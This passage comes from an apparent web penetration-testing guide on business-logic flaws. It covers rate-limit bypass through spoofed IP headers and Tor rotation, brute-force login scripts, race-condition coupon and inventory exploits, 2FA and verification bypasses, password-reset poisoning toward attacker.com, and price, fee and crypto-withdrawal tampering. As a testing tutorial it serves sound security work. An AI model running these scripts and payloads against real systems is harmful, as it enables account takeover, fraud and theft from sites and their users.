curl -X POST https://target.com/admin/refund \
  -H "Cookie: session=LOW_PRIV_USER" \
  -d "order_id=VICTIM_ORDER"
```

**Consistency Checking** Monitor application state across different interfaces (web, mobile API, admin panel) for inconsistencies that can be exploited.

**Negative Testing** Test boundary conditions systematically:

- Negative amounts, zero values, maximum integers
- Empty strings, null values, undefined parameters
- Special characters in numeric fields

---

## Rate Limit Bypass

Rate limiting controls the frequency of requests to prevent abuse, credential stuffing, brute force attacks, and resource exhaustion. Bypasses exploit implementation weaknesses in how requests are counted or identified.

### Detection Methodology

**Identifying rate limits:**

```bash
# Automated request flooding
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/login \
  -d "username=admin&password=test$i"
done
```

**Common indicators:**

- HTTP 429 (Too Many Requests)
- HTTP 403 with rate limit message
- Custom error codes (420, 430)
- "Retry-After" header
- Temporary account lockouts
- CAPTCHA triggers

**Response timing analysis:**

```bash
# Measure response time variations
time curl -X POST http://target.com/api/endpoint -d "data=test"
```

Increasing response times may indicate throttling rather than hard blocking.

### IP-Based Bypass Techniques

**X-Forwarded-For Header Manipulation:**

```http
POST /api/login HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4
Content-Type: application/json

{"username":"admin","password":"test"}
```

**Header variations to test:**

```http
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-Client-IP: 1.2.3.4
X-Host: 1.2.3.4
True-Client-IP: 1.2.3.4
Forwarded-For: 1.2.3.4
Forwarded: for=1.2.3.4
CF-Connecting-IP: 1.2.3.4
Fastly-Client-IP: 1.2.3.4
X-Cluster-Client-IP: 1.2.3.4
```

**Burp Suite automation:**

```python
# Burp extension: Header rotator
headers = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP"]
for i in range(1000):
    for header in headers:
        request.addHeader(header, f"192.168.1.{i % 255}")
```

**IPv6 bypass:**

```http
X-Forwarded-For: 2001:db8::1
X-Forwarded-For: ::1
X-Forwarded-For: fe80::1
```

Many rate limiters only track IPv4 addresses.

**IP rotation with proxies:**

```bash
# Using proxychains with rotating SOCKS proxies
proxychains4 hydra -l admin -P passwords.txt http-post-form://target.com/login

# Tor circuit rotation
for i in {1..100}; do
  curl --socks5-hostname 127.0.0.1:9050 http://target.com/api/endpoint
  # Rotate circuit
  echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
  sleep 2
done
```

### Session-Based Bypass

**Cookie deletion/rotation:**

```bash
# Request without session persistence
curl -X POST http://target.com/api/endpoint -d "data=test" -c /dev/null
```

**Multiple session creation:**

```python
import requests

# Create new session for each request
for i in range(1000):
    session = requests.Session()
    response = session.post("http://target.com/api/login", 
                           data={"username": "admin", "password": f"pass{i}"})
    print(f"Attempt {i}: {response.status_code}")
```

**Session ID manipulation:**

```http
Cookie: sessionid=abc123
Cookie: sessionid=abc124
Cookie: sessionid=abc125
```

Incrementing session IDs may bypass per-session rate limits if validation is weak.

### Parameter Pollution

**Multiple parameter submission:**

```http
POST /api/transfer HTTP/1.1
Host: target.com

amount=100&amount=200&amount=300
```

The application may rate limit based on first parameter but process the last.

**Array-based pollution:**

```http
POST /api/endpoint HTTP/1.1
Content-Type: application/json

{"user": ["victim", "attacker", "admin"]}
```

**Case variation:**

```http
username=admin
Username=admin
USERNAME=admin
uSeRnAmE=admin
```

Rate limiter may normalize differently than backend processor.

**Encoding variations:**

```http
# URL encoding
username=admin
username=%61dmin

# Unicode encoding
username=admin
username=\u0061dmin

# Double encoding
username=%2561dmin
```

### HTTP Method Tampering

```bash
# Standard POST request (rate limited)
curl -X POST http://target.com/api/endpoint -d "data=test"

# Try alternative methods
curl -X GET "http://target.com/api/endpoint?data=test"
curl -X PUT http://target.com/api/endpoint -d "data=test"
curl -X PATCH http://target.com/api/endpoint -d "data=test"
curl -X DELETE "http://target.com/api/endpoint?data=test"
curl -X OPTIONS http://target.com/api/endpoint
```

**Method override headers:**

```http
POST /api/endpoint HTTP/1.1
X-HTTP-Method-Override: GET

POST /api/endpoint HTTP/1.1
X-Method-Override: PUT
```

### Race Condition Exploitation

**Parallel request flooding:**

```bash
# GNU parallel
seq 1 1000 | parallel -j 50 'curl -X POST http://target.com/api/endpoint -d "data=test{}"'

# Burp Intruder with thread count
# Set thread count to 50-100
# Disable payload processing delays
```

**Python asyncio approach:**

```python
import asyncio
import aiohttp

async def send_request(session, url, i):
    async with session.post(url, json={"attempt": i}) as response:
        return await response.text()

async def main():
    url = "http://target.com/api/endpoint"
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, i) for i in range(1000)]
        results = await asyncio.gather(*tasks)
        print(f"Completed: {len(results)}")

asyncio.run(main())
```

**Turbo Intruder (Burp extension):**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(1000):
        engine.queue(target.req, str(i), gate='race1')
    
    # Open floodgates
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Null Byte and Special Character Injection

**Username parameter manipulation:**

```http
username=admin%00
username=admin%0A
username=admin%0D
username=admin%09
username=admin%20
username=admin\x00
```

The rate limiter may track "admin\x00" while authentication processes "admin".

**Space variations:**

```http
username= admin
username=admin 
username=%20admin%20
```

### Distributed Rate Limit Bypass

**Subdomain enumeration:**

```bash
# Test rate limits across subdomains
for sub in api www cdn mobile; do
  curl -X POST http://$sub.target.com/api/login -d "username=admin&password=test"
done
```

**Port variation:**

```bash
# Test alternative ports if exposed
curl -X POST http://target.com:8080/api/endpoint
curl -X POST http://target.com:8443/api/endpoint
```

**Protocol switching:**

```bash
# HTTP vs HTTPS rate limit pools
curl -X POST http://target.com/api/endpoint
curl -X POST https://target.com/api/endpoint
```

### GraphQL-Specific Bypasses

**Alias batching:**

```graphql
mutation {
  login1: login(username: "admin", password: "pass1") { token }
  login2: login(username: "admin", password: "pass2") { token }
  login3: login(username: "admin", password: "pass3") { token }
  # ... up to query complexity limit
}
```

**Fragment exploitation:**

```graphql
fragment loginAttempt on Mutation {
  login(username: "admin", password: "test") { token }
}

mutation {
  attempt1: ...loginAttempt
  attempt2: ...loginAttempt
  attempt3: ...loginAttempt
}
```

### Tools and Automation

**Burp Rate Limit Bypass Extension:**

```bash
# Install from BApp Store: "Rate Limit Bypass"
# Configure automatic header rotation
# Enable IP spoofing variations
```

**Custom Python rate limit tester:**

```python
import requests
from itertools import cycle

headers_list = [
    {"X-Forwarded-For": f"192.168.1.{i}"} for i in range(1, 255)
]
header_cycle = cycle(headers_list)

url = "http://target.com/api/login"
for attempt in range(1000):
    headers = next(header_cycle)
    response = requests.post(url, 
                           data={"username": "admin", "password": f"pass{attempt}"},
                           headers=headers)
    
    if response.status_code != 429:
        print(f"Attempt {attempt}: {response.status_code}")
    
    if "success" in response.text.lower():
        print(f"SUCCESS at attempt {attempt}")
        break
```

**ffuf with header injection:**

```bash
# Wordlist for X-Forwarded-For IPs
seq 1 255 | awk '{print "192.168.1."$1}' > ips.txt

# Rate limit bypass testing
ffuf -u http://target.com/api/login \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -w passwords.txt \
     -H "X-Forwarded-For: XFUZZX" \
     -w ips.txt:XFUZZX \
     -mode clusterbomb \
     -mc 200,302 \
     -t 50
```

**RateLimiter bypass script (all techniques combined):**

```python
import requests
import random
import string

class RateLimitBypass:
    def __init__(self, url):
        self.url = url
        self.headers_rotation = [
            "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
            "X-Remote-IP", "X-Client-IP", "True-Client-IP"
        ]
    
    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    def random_header(self):
        return random.choice(self.headers_rotation)
    
    def send_request(self, data):
        headers = {self.random_header(): self.random_ip()}
        session = requests.Session()
        
        try:
            response = session.post(self.url, data=data, headers=headers, timeout=5)
            return response
        except Exception as e:
            return None
    
    def brute_force(self, username, passwords):
        for password in passwords:
            response = self.send_request({"username": username, "password": password})
            if response and response.status_code not in [429, 403]:
                print(f"[+] Testing: {password} - Status: {response.status_code}")
                if "success" in response.text.lower() or response.status_code == 302:
                    print(f"[!] FOUND: {username}:{password}")
                    return True
        return False
```

## Workflow State Bypass

Applications often implement multi-step processes (checkout, registration, verification) with state validation. Bypasses exploit insufficient verification of state transitions.

### Multi-Step Process Manipulation

**Standard workflow:**

```
Step 1: Add item to cart
Step 2: Enter shipping info
Step 3: Select payment method
Step 4: Review order
Step 5: Complete purchase
```

**Direct step skipping:**

```bash
# Skip directly to step 5 without completing earlier steps
curl -X POST http://target.com/checkout/complete \
     -d "order_id=12345" \
     -H "Cookie: session=abc123"
```

**Burp workflow analysis:**

1. Capture all requests in normal workflow
2. Identify state indicators (tokens, step parameters, hidden fields)
3. Replay final step requests with manipulated state values
4. Test omitting intermediate validation requests

### Parameter Tampering for State Control

**Step parameter manipulation:**

```http
POST /checkout HTTP/1.1
Host: target.com

step=1
```

Change to:

```http
step=5
current_step=5
checkout_step=complete
```

**Hidden field exploitation:**

```html
<!-- Original form -->
<input type="hidden" name="step" value="2">
<input type="hidden" name="verified" value="false">
<input type="hidden" name="payment_completed" value="0">
```

Intercept and modify:

```html
<input type="hidden" name="step" value="5">
<input type="hidden" name="verified" value="true">
<input type="hidden" name="payment_completed" value="1">
```

**State token manipulation:**

```http
POST /api/process HTTP/1.1
Content-Type: application/json

{
  "state_token": "eyJzdGVwIjoyLCJ2ZXJpZmllZCI6ZmFsc2V9",
  "action": "continue"
}
```

Decode token (often base64 JWT):

```bash
echo "eyJzdGVwIjoyLCJ2ZXJpZmllZCI6ZmFsc2V9" | base64 -d
# {"step":2,"verified":false}
```

Modify and re-encode:

```bash
echo -n '{"step":5,"verified":true}' | base64
# eyJzdGVwIjo1LCJ2ZXJpZmllZCI6dHJ1ZX0=
```

### Request Replay and Reordering

**Out-of-order execution:**

```bash
# Normal order: Request A -> B -> C
# Test: Request A -> C (skip B)
# Test: Request C -> A -> B (reverse order)
```

**Duplicate submission:**

```bash
# Submit payment confirmation twice
curl -X POST http://target.com/api/confirm-payment -d "order_id=123"
curl -X POST http://target.com/api/confirm-payment -d "order_id=123"
```

May result in double-crediting, duplicate resource allocation.

**Race condition in state transitions:**

```python
import threading
import requests

def exploit_race():
    url = "http://target.com/api/redeem-coupon"
    data = {"coupon": "DISCOUNT50", "order_id": "12345"}
    
    def send_request():
        response = requests.post(url, data=data)
        print(response.text)
    
    # Send multiple simultaneous requests
    threads = [threading.Thread(target=send_request) for _ in range(10)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

exploit_race()
```

### Forced Browsing and Direct Object Access

**Accessing unauthorized states:**

```bash
# User shouldn't access admin approval page
curl http://target.com/admin/approve-order?id=12345 \
     -H "Cookie: session=user_session_token"

# Bypass verification step
curl http://target.com/account/verified-dashboard \
     -H "Cookie: session=unverified_user_token"
```

**IDOR in workflow states:**

```http
GET /api/order/12345/status HTTP/1.1
# Response: {"status": "pending_payment"}

POST /api/order/12345/status HTTP/1.1
Content-Type: application/json

{"status": "completed"}
```

### Time-Based State Manipulation

**Expiration bypass:**

```bash
# Capture expired verification token
# Replay with modified timestamp

# Original request
POST /verify HTTP/1.1
token=abc123&timestamp=1697500000

# Modified with future timestamp
POST /verify HTTP/1.1
token=abc123&timestamp=2000000000
```

**Session fixation in workflows:**

```bash
# Generate session in initial state
curl http://target.com/start-process
# Set-Cookie: workflow_session=xyz789

# Complete workflow with legitimate account
# Reuse workflow_session with attacker account
curl http://target.com/complete-process \
     -H "Cookie: workflow_session=xyz789; user_session=attacker_session"
```

### Email Verification Bypass

**Direct account activation:**

```bash
# Normal flow: Register -> Receive email -> Click link
# Bypass: Predict verification token pattern

# Observed verification URLs
http://target.com/verify?token=user123_1697500000_abc
http://target.com/verify?token=user456_1697500001_def

# Craft token for own account
http://target.com/verify?token=attacker_1697500002_ghi
```

**Token reuse:**

```bash
# Use verification token from one account on another
# Register account1@example.com -> receive token T1
# Register attacker@example.com
# Apply T1 to attacker@example.com
```

**Parameter pollution in verification:**

```http
GET /verify?email=attacker@example.com&email=victim@example.com&token=valid_token HTTP/1.1
```

Application may verify victim's token but activate attacker's account.

### 2FA/MFA Bypass Techniques

**Response manipulation:**

```http
POST /api/verify-2fa HTTP/1.1
{"code": "000000"}

# Response
{"success": false, "verified": false}
```

Intercept response and modify:

```http
{"success": true, "verified": true}
```

**Direct endpoint access:**

```bash
# Skip 2FA prompt page
curl http://target.com/dashboard \
     -H "Cookie: session=session_before_2fa"
```

**2FA code reuse:**

```bash
# Capture valid 2FA code
# Use same code multiple times or on different sessions
```

**Null/empty code submission:**

```http
POST /verify-2fa HTTP/1.1
code=
code=null
code=undefined
```

**Credential enumeration via state leakage:**

```bash
# Invalid username/password at login
Response: "Invalid credentials"

# Valid username/password + invalid 2FA
Response: "Invalid 2FA code"

# This confirms valid credentials before 2FA
```

### OAuth Flow Manipulation

**State parameter bypass:**

```http
# Normal OAuth flow
GET /oauth/authorize?client_id=123&redirect_uri=https://target.com/callback&state=random123

# Bypass CSRF protection
GET /oauth/authorize?client_id=123&redirect_uri=https://target.com/callback&state=
GET /oauth/authorize?client_id=123&redirect_uri=https://target.com/callback
```

**Pre-account takeover:**

```bash
# Attacker initiates OAuth flow with victim's email
# Victim completes verification
# Attacker gains access to now-verified account
```

**Code reuse in authorization code flow:**

```bash
# Capture authorization code
code=ABC123

# Exchange code for token (legitimate)
POST /oauth/token
grant_type=authorization_code&code=ABC123

# Attempt reuse (should fail but test anyway)
POST /oauth/token
grant_type=authorization_code&code=ABC123
```

### Account Takeover via Workflow Bypass

**Password reset poisoning:**

```http
POST /password-reset HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```

Password reset link sent to victim contains attacker's domain:

```
https://attacker.com/reset?token=valid_reset_token
```

**Registration collision:**

```bash
# Register with victim's email + extra space
email=victim@example.com 

# System may trim space in verification but use full email in account creation
# Attacker receives verification email
```

**Account migration exploitation:**

```bash
# Merge account workflow
1. Login with Account A (attacker-controlled)
2. Request merge with Account B (victim)
3. System sends verification to Account B
4. Bypass verification step
5. Account B merged into Account A
```

### Tools for Workflow Analysis

**Burp Sequencer for token analysis:**

```
1. Capture state tokens from workflow
2. Send to Sequencer
3. Analyze entropy and predictability
4. Generate valid tokens for unauthorized states
```

**AuthMatrix extension:**

```bash
# Install from BApp Store
# Define user roles and permissions
# Map workflow steps to required authorization
# Automatically test access control across workflow states
```

**Custom Python workflow fuzzer:**

```python
import requests
import itertools

class WorkflowFuzzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.steps = []
    
    def add_step(self, endpoint, method, data):
        self.steps.append({"endpoint": endpoint, "method": method, "data": data})
    
    def test_permutations(self):
        # Test all possible step orders
        for perm in itertools.permutations(self.steps):
            print(f"Testing order: {[s['endpoint'] for s in perm]}")
            session = requests.Session()
            
            for step in perm:
                url = self.base_url + step["endpoint"]
                if step["method"] == "POST":
                    response = session.post(url, data=step["data"])
                else:
                    response = session.get(url)
                
                print(f"  {step['endpoint']}: {response.status_code}")
            
            # Check if final state achieved
            final_check = session.get(self.base_url + "/final-state")
            if final_check.status_code == 200:
                print(f"[!] BYPASS FOUND with order: {[s['endpoint'] for s in perm]}")

# Usage
fuzzer = WorkflowFuzzer("http://target.com")
fuzzer.add_step("/step1", "POST", {"action": "init"})
fuzzer.add_step("/step2", "POST", {"info": "data"})
fuzzer.add_step("/step3", "POST", {"confirm": "yes"})
fuzzer.test_permutations()
```

## Calculation Errors

Applications performing price calculations, quantity validations, or mathematical operations may contain exploitable logic errors.

### Price Manipulation

**Negative quantity exploitation:**

```http
POST /api/cart/add HTTP/1.1
Content-Type: application/json

{
  "item_id": 123,
  "quantity": -1,
  "price": 100.00
}
```

If total = quantity Ã— price, negative quantity yields negative total, potentially crediting money to attacker.

**Integer overflow:**

```http
POST /api/purchase HTTP/1.1

{
  "item_id": 456,
  "quantity": 2147483648,
  "price": 0.01
}
```

Large quantities may overflow integer storage, wrapping to negative or zero values.

**Decimal precision abuse:**

```http
POST /api/cart HTTP/1.1

{
  "item_id": 789,
  "price": 100.00,
  "discount": 0.999999999999999
}
```

Floating-point precision errors may result in 100% discount.

**Currency manipulation:**

```http
POST /api/checkout HTTP/1.1

{
  "total": 100,
  "currency": "USD"
}
```

Modify to:

```http
{
  "total": 100,
  "currency": "JPY"
}
```

If backend doesn't recalculate, 100 USD becomes 100 JPY (approximately $0.67).

**Price parameter injection:**

```http
POST /cart/add HTTP/1.1

item_id=123&quantity=1&price=99.99
```

Change price parameter:

```http
item_id=123&quantity=1&price=0.01
```

If application trusts client-side price, purchase at attacker-defined price.

### Discount and Coupon Abuse

**Coupon stacking:**

```http
POST /api/apply-coupon HTTP/1.1

{
  "coupons": ["DISCOUNT10", "SAVE20", "EXTRA15"]
}
```

Apply multiple coupons if validation checks each individually but not cumulative total.

**Negative discount codes:**

```http
POST /api/apply-discount HTTP/1.1

{
  "discount_code": "SPECIAL",
  "discount_amount": -50
}
```

Negative discount adds to total, but subsequent processing may invert sign.

**Percentage overflow:**

```http
POST /checkout HTTP/1.1

{
  "discount_percent": 150
}
```

150% discount may result in negative total or crediting excess.

**Race condition in coupon redemption:**

```python
import requests
import threading

def redeem_coupon():
    url = "http://target.com/api/redeem"
    data = {"coupon": "ONETIME50", "cart_id": "cart123"}
    response = requests.post(url, json=data)
    print(response.json())

# Redeem single-use coupon multiple times simultaneously
threads = [threading.Thread(target=redeem_coupon) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### Reward/Credit System Exploitation

**Referral bonus manipulation:**

```bash
# Self-referral
1. Create Account A with referral link
2. Create Account B using Account A's referral link
3. Both accounts receive bonuses

# Automation
for i in {1..100}; do
  curl -X POST http://target.com/register \
       -d "email=user$i@example.com&referral_code=ACCOUNT_A"
done
```

**Cashback multiplication:**

```http
POST /api/transaction HTTP/1.1

{
  "amount": 100.00,
  "apply_cashback": true
}
```

Cancel and resubmit transaction multiple times to accumulate cashback without completing purchase.

**Point/credit duplication:**

```bash
# Transfer credits between accounts
curl -X POST http://target.com/api/transfer \
     -d "from_account=A&to_account=B&amount=1000"

# If transfer isn't atomic, interrupt mid-transaction
# Both accounts may retain credits
```

**Replay attack on reward claims:**

```http
POST /api/claim-reward HTTP/1.1
Authorization: Bearer token123

{"reward_id": "daily_bonus"}
```

Capture and replay request to claim reward multiple times.

### Quantity and Inventory Manipulation

**Overselling via race conditions:**

```python
import asyncio
import aiohttp

async def purchase_limited_item(session):
    url = "http://target.com/api/purchase"
    data = {"item_id": "limited_edition", "quantity": 1}
    async with session.post(url, json=data) as response:
        return await response.json()

async def main():
    # Item has only 10 units in stock
    # Attempt 100 simultaneous purchases
    async with aiohttp.ClientSession() as session:
        tasks = [purchase_limited_item(session) for _ in range(100)]
        results = await asyncio.gather(*tasks)
        successful = sum(1 for r in results if r.get('success'))
        print(f"Successful purchases: {successful}")

asyncio.run(main())
```

If inventory check and decrement aren't atomic, overselling occurs.

**Maximum purchase limit bypass:**

```http
POST /api/cart/add HTTP/1.1

{
  "item_id": 123,
  "quantity": 5
}
```

Add item 5 times (below limit) vs. adding once with quantity 25 (above limit). Test if validation differs.

**Bundle quantity manipulation:**

```http
POST /api/cart/add HTTP/1.1

{
  "bundle_id": 999,
  "items": [
    {"id": 1, "quantity": 100},
    {"id": 2, "quantity": 100}
  ]
}
```

Bundle may have overall quantity limit but not per-item limits.

### Time-Based Calculation Exploits

**Trial period extension:**

```http
POST /api/subscribe HTTP/1.1

{
  "plan": "premium",
  "trial_days": 7
}
```

Modify trial_days:

```http
{"plan": "premium", "trial_days": 365}
{"plan": "premium", "trial_days": -1}
```

Negative days may cause integer underflow, granting maximum duration.

**Subscription overlap:**

```bash
# Subscribe to monthly plan on day 28
# Cancel on day 30
# Resubscribe on day 1 of next month
# System may grant trial again or prorate incorrectly
```

**Timezone manipulation:**

```http
POST /api/daily-claim HTTP/1.1

{
  "timestamp": "2024-10-15T23:59:59Z",
  "timezone": "UTC"
}
```

Change timezone:

```http
{"timestamp": "2024-10-15T23:59:59Z", "timezone": "Pacific/Kiritimati"}
```

May allow claiming daily rewards multiple times by timezone hopping.

### Transaction Rounding Errors

**Salami slicing:**

```http
POST /api/transfer HTTP/1.1

{
  "from": "account_A",
  "to": "account_B",
  "amount": 0.001
}
```

Repeatedly transfer small amounts that round down in one account but round up in another, accumulating excess.

**Batch transaction manipulation:**

```http
POST /api/batch-payment HTTP/1.1

{
  "transactions": [
    {"to": "user1", "amount": 10.5},
    {"to": "user2", "amount": 10.5},
    {"to": "attacker", "amount": 0.1}
  ],
  "total": 21.0
}
```

If validation only checks total, insert attacker transaction funded by rounding errors.

**Tax calculation bypass:**

```http
POST /checkout HTTP/1.1

{
  "subtotal": 100.00,
  "tax": 0.00,
  "shipping": 10.00,
  "total": 110.00
}
```

Manually set tax to 0 if recalculated on client side only.

### Mathematical Logic Flaws

**Division by zero exploitation:**

```http
POST /api/calculate-discount HTTP/1.1

{
  "original_price": 100.00,
  "discount_divisor": 0
}
```

May cause application crash revealing error messages with sensitive data, or default to maximum discount.

**Modulo operation abuse:**

```bash
# Reward system: points % 100 determines tier
# User with 199 points = tier 99
# User with 99 points = tier 99

# Achieve high tier with fewer points
```

**Boolean logic bypass:**

```http
POST /api/verify HTTP/1.1

{
  "condition_A": true,
  "condition_B": false,
  "result": true
}
```

If backend trusts client-provided "result" instead of recalculating from conditions.

**Statistical manipulation:**

```bash
# Rating system allowing
# ratings between 1-5

# Submit fractional or out-of-range values

POST /api/rate HTTP/1.1

{ "product_id": 123, "rating": 5.5 }
````

Or:
```http
{
  "product_id": 123,
  "rating": 1000
}
````

May skew average calculations or cause database errors.

**Weighted average manipulation:**

```http
POST /api/vote HTTP/1.1

{
  "option_id": 42,
  "weight": 1
}
```

Modify weight parameter:

```http
{
  "option_id": 42,
  "weight": 99999
}
```

If weight is trusted from client, single vote dominates results.

### Loyalty and Gamification Exploits

**Experience point (XP) duplication:**

```http
POST /api/complete-task HTTP/1.1

{
  "task_id": 789,
  "xp_earned": 100
}
```

Intercept and replay, or modify xp_earned value:

```http
{
  "task_id": 789,
  "xp_earned": 999999
}
```

**Achievement unlock bypass:**

```http
POST /api/achievements HTTP/1.1

{
  "achievement_id": "rare_achievement",
  "unlocked": true,
  "timestamp": "2024-10-16T10:00:00Z"
}
```

Directly set unlocked status without meeting criteria.

**Leaderboard manipulation:**

```http
POST /api/submit-score HTTP/1.1

{
  "game_id": 456,
  "score": 1000000,
  "verification_token": "abc123"
}
```

Test if verification_token is validated properly, or if scores from client are trusted.

**Streak counter exploitation:**

```bash
# Daily login streak
# Day 1: Login normally
# Day 2: Manipulate system time/timezone
curl -X POST http://target.com/api/daily-checkin \
     -H "X-Client-Time: 2024-10-17T00:00:01Z"

# Day 2 (again): Change timezone
curl -X POST http://target.com/api/daily-checkin \
     -H "X-Client-Time: 2024-10-17T23:59:59Z" \
     -H "X-Timezone: Pacific/Auckland"
```

May allow multiple check-ins per day by timezone manipulation.

### Fee and Commission Bypass

**Transaction fee avoidance:**

```http
POST /api/transfer HTTP/1.1

{
  "amount": 1000.00,
  "fee": 10.00,
  "total": 1010.00
}
```

Modify fee to 0:

```http
{
  "amount": 1000.00,
  "fee": 0.00,
  "total": 1000.00
}
```

**Minimum purchase threshold bypass:**

```http
POST /checkout HTTP/1.1

{
  "items": [
    {"id": 1, "price": 5.00},
    {"id": 2, "price": 5.00}
  ],
  "subtotal": 10.00,
  "shipping": 5.00,
  "minimum_threshold_met": false
}
```

Change flag:

```http
"minimum_threshold_met": true
```

Or add item then remove it after threshold validation:

```bash
1. Add item worth $50 (meets minimum)
2. Apply free shipping
3. Remove $50 item
4. Complete checkout with only $5 item + free shipping
```

**Commission splitting exploit:**

```http
POST /api/affiliate-sale HTTP/1.1

{
  "sale_amount": 100.00,
  "affiliate_commission": 10.00,
  "platform_commission": 5.00
}
```

If commissions are client-specified and sum isn't validated:

```http
{
  "sale_amount": 100.00,
  "affiliate_commission": 50.00,
  "platform_commission": 0.00
}
```

### Cryptocurrency and Blockchain Logic Flaws

**Wei/Satoshi precision manipulation:**

```http
POST /api/withdraw-crypto HTTP/1.1

{
  "amount": "1.0",
  "currency": "ETH",
  "amount_wei": "1000000000000000000"
}
```

Modify wei amount independently:

```http
{
  "amount": "1.0",
  "currency": "ETH",
  "amount_wei": "10000000000000000000"
}
```

If backend trusts wei value, withdraw 10 ETH while display shows 1 ETH.

**Gas fee manipulation:**

```http
POST /api/send-transaction HTTP/1.1

{
  "recipient": "0x123...",
  "amount": "1.0",
  "gas_fee": "0.01",
  "total_deducted": "1.01"
}
```

Set gas_fee to 0:

```http
{
  "recipient": "0x123...",
  "amount": "1.0",
  "gas_fee": "0.00",
  "total_deducted": "1.00"
}
```

**Confirmation threshold bypass:**

```bash
# Platform requires 6 blockchain confirmations
# Check if transaction status endpoint can be manipulated

GET /api/transaction/status?tx_hash=0xabc...&confirmations=6

# System might trust client-provided confirmation count
```

### Auction and Bidding System Flaws

**Bid retraction after winning:**

```bash
# Place winning bid
POST /api/bid
{"auction_id": 123, "amount": 1000}

# Win auction
# Retract bid immediately
DELETE /api/bid/456

# If retraction processed before auction close logic
```

**Auto-bid ceiling exploitation:**

```http
POST /api/autobid HTTP/1.1

{
  "auction_id": 789,
  "max_bid": 500,
  "increment": 10
}
```

Probe max_bid by placing bids slightly below:

```bash
# Bid $490 - auto-bid responds with $500
# Now known competitor's maximum is $500
# Bid $501 to win
```

**Last-second bidding with clock manipulation:**

```http
POST /api/bid HTTP/1.1
X-Client-Time: 2024-10-16T23:59:58Z

{
  "auction_id": 123,
  "amount": 1001
}
```

If server trusts client timestamp and auction ends at 23:59:59, extend bidding window.

**Minimum increment bypass:**

```http
# Minimum bid increment: $10
# Current bid: $100

POST /api/bid HTTP/1.1
{
  "auction_id": 123,
  "amount": 100.01
}
```

Test fractional amounts below minimum increment.

### Fractional Share and Resource Division

**Stock trading fractional shares:**

```http
POST /api/trade HTTP/1.1

{
  "symbol": "AAPL",
  "quantity": 0.000000001,
  "action": "buy"
}
```

Extremely small quantities may:

- Round to zero cost
- Bypass minimum trade requirements
- Accumulate through repeated trades

**Resource allocation rounding:**

```http
POST /api/allocate-resources HTTP/1.1

{
  "users": [
    {"id": 1, "allocation": 33.33},
    {"id": 2, "allocation": 33.33},
    {"id": 3, "allocation": 33.33}
  ],
  "total": 100
}
```

Rounding may leave 0.01 unallocated. Make large number of allocations to accumulate significant remainder.

### Testing Methodology and Tools

**Calculation fuzzer script:**

```python
import requests
import itertools

class CalculationFuzzer:
    def __init__(self, url, param_name):
        self.url = url
        self.param_name = param_name
        
    def test_values(self):
        test_cases = [
            0,                    # Zero
            -1,                   # Negative
            0.0000001,           # Tiny decimal
            999999999,           # Large number
            -999999999,          # Large negative
            2147483647,          # Max 32-bit int
            2147483648,          # Int overflow
            -2147483648,         # Min 32-bit int
            9223372036854775807, # Max 64-bit int
            float('inf'),        # Infinity
            float('-inf'),       # Negative infinity
            None,                # Null
            "",                  # Empty string
            "1e308",             # Scientific notation
            "NaN",               # Not a number
        ]
        
        for value in test_cases:
            data = {self.param_name: value}
            try:
                response = requests.post(self.url, json=data, timeout=5)
                print(f"[{value}] Status: {response.status_code}")
                if response.status_code == 200:
                    print(f"  Response: {response.text[:100]}")
            except Exception as e:
                print(f"[{value}] Error: {e}")

# Usage
fuzzer = CalculationFuzzer("http://target.com/api/calculate", "amount")
fuzzer.test_values()
```

**Arithmetic operation fuzzer:**

```python
import requests

class ArithmeticExploiter:
    def __init__(self, base_url):
        self.base_url = base_url
    
    def test_price_manipulation(self):
        # Test negative quantities
        self.test_endpoint("/cart/add", {
            "item_id": 123,
            "quantity": -1,
            "price": 100
        })
        
        # Test integer overflow
        self.test_endpoint("/cart/add", {
            "item_id": 123,
            "quantity": 2147483648,
            "price": 0.01
        })
        
        # Test price override
        self.test_endpoint("/cart/add", {
            "item_id": 123,
            "quantity": 1,
            "price": 0.01
        })
        
        # Test decimal precision
        self.test_endpoint("/apply-discount", {
            "discount_percent": 99.999999999
        })
        
    def test_endpoint(self, endpoint, data):
        url = self.base_url + endpoint
        try:
            response = requests.post(url, json=data)
            print(f"\n[{endpoint}]")
            print(f"Data: {data}")
            print(f"Status: {response.status_code}")
            print(f"Response: {response.text[:200]}")
        except Exception as e:
            print(f"Error: {e}")

# Usage
exploiter = ArithmeticExploiter("http://target.com")
exploiter.test_price_manipulation()
```

**Burp Intruder payload configurations:**

For quantity fuzzing:

```
Payload type: Numbers
From: -1000
To: 1000
Step: 1

Add: 2147483647, 2147483648, -2147483648
```

For price manipulation:

```
Payload type: Custom iterator
Position 1: [-1000, -1, 0, 0.01, 0.001, 100, 999999]
Position 2: [.00, .01, .99, .999999]
```

For percentage fields:

```
Payload type: Numbers
From: -100
To: 200
Step: 0.1

Add special values: 999, -999, 100.00000001
```

**Decimal precision tester:**

```python
import decimal
import requests

def test_precision():
    url = "http://target.com/api/calculate"
    
    # Test various precision levels
    test_values = [
        "0.1",
        "0.01",
        "0.001",
        "0.0001",
        "0.00001",
        "0.000001",
        "0.0000001",
        "0.00000001",
        "0.999999999999999",
        "1.0000000000000001",
    ]
    
    for value in test_values:
        # Use Decimal for exact representation
        precise_value = str(decimal.Decimal(value))
        data = {"amount": precise_value}
        response = requests.post(url, json=data)
        print(f"Value: {value} -> Response: {response.json()}")

test_precision()
```

**Race condition tester for calculations:**

